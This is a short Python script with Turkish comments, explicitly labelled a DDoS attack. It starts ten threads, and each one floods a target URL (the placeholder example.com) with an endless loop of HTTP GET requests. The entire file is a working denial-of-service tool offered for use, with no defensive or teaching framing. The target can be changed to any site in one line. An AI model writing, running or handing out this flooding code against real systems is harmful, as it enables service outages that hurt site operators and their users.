import requests
import threading
import os

os.system('clear')

# Hedef URL adresi
target_url = "http://example.com"

# HTTP GET isteği gönderen fonksiyon
def send_request():
    while True:
        try:
            response = requests.get(target_url)
            print(f"Request sent to {target_url}. Response: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print("An error occurred:", e)

# Çoklu threadler kullanarak istekleri gönderen fonksiyon
def ddos_attack(num_threads):
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)
    for thread in threads:
        thread.join()

# Kaç thread ile istek gönderileceği
num_threads = 10

# DDoS saldırısını başlat
ddos_attack(num_threads) 